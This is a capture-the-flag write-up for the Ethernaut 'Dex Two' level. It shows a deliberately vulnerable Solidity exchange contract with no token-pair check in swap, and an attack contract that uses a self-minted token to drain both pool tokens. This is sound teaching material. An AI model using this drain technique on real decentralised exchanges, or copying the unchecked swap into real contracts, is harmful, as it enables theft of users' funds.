# 23 - Dex Two

Ethernaut Level23: [Dex Two](https://ethernaut.openzeppelin.com/level/0x0b6F6CE4BCfB70525A31454292017F640C10c768)

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "openzeppelin-contracts-08/token/ERC20/IERC20.sol";
import "openzeppelin-contracts-08/token/ERC20/ERC20.sol";
import 'openzeppelin-contracts-08/access/Ownable.sol';

contract DexTwo is Ownable {
  address public token1;
  address public token2;
  constructor() {}

  function setTokens(address _token1, address _token2) public onlyOwner {
    token1 = _token1;
    token2 = _token2;
  }

  function add_liquidity(address token_address, uint amount) public onlyOwner {
    IERC20(token_address).transferFrom(msg.sender, address(this), amount);
  }
  
  function swap(address from, address to, uint amount) public {
    require(IERC20(from).balanceOf(msg.sender) >= amount, "Not enough to swap");
    uint swapAmount = getSwapAmount(from, to, amount);
    IERC20(from).transferFrom(msg.sender, address(this), amount);
    IERC20(to).approve(address(this), swapAmount);
    IERC20(to).transferFrom(address(this), msg.sender, swapAmount);
  } 

  function getSwapAmount(address from, address to, uint amount) public view returns(uint){
    return((amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this)));
  }

  function approve(address spender, uint amount) public {
    SwappableTokenTwo(token1).approve(msg.sender, spender, amount);
    SwappableTokenTwo(token2).approve(msg.sender, spender, amount);
  }

  function balanceOf(address token, address account) public view returns (uint){
    return IERC20(token).balanceOf(account);
  }
}

contract SwappableTokenTwo is ERC20 {
  address private _dex;
  constructor(address dexInstance, string memory name, string memory symbol, uint initialSupply) ERC20(name, symbol) {
        _mint(msg.sender, initialSupply);
        _dex = dexInstance;
  }

  function approve(address owner, address spender, uint256 amount) public {
    require(owner != _dex, "InvalidApprover");
    super._approve(owner, spender, amount);
  }
}
```

### Goal of this level

* drain all balances of token1 and token2 from the `DexTwo` contract&#x20;

## Solution

<details>

<summary>Key to solve this problem 🔑</summary>

Check what's different from 22 - Dex !

</details>

```solidity
contract AttackDexTwo is ERC20 {
  DexTwo dexTwoContract;
  address token1;
  address token2;

  constructor() ERC20("AttackDexTwo", "ADT") {
    _mint(address(this), 10000);
  }

  function attack(DexTwo _instance) external {
    dexTwoContract = _instance;
    
    token1 = dexTwoContract.token1();
    token2 = dexTwoContract.token2();

    ERC20(address(this)).approve(address(dexTwoContract), 1000);
    ERC20(address(this)).approve(address(dexTwoContract), 1000);

    ERC20(address(this)).transfer(address(dexTwoContract), 100);

    dexTwoContract.swap(address(this), token1, 100);
    dexTwoContract.swap(address(this), token2, 200);
  }
}
```

```solidity
require((from == token1 && to == token2) || (from == token2 && to == token1), "Invalid tokens");
```

Because this condition is removed, we can swap any pair of tokens.

Frist, we transfer `100 ADT` to **`DexTwo`** contract.

Then we swap 100 `ADT` and 100 `token1` \
(price will be 0 since **`DexTwo`** contract has 100 `token1` and 100 `ADT`)

Now DexTwo contract has 100 `token2` and 200 `ADT`.

So if we exchange our 200 `ADT` with `token2`, \
the swap amount will be `(200 * 100) / 200 === 100`.

Done! 😎
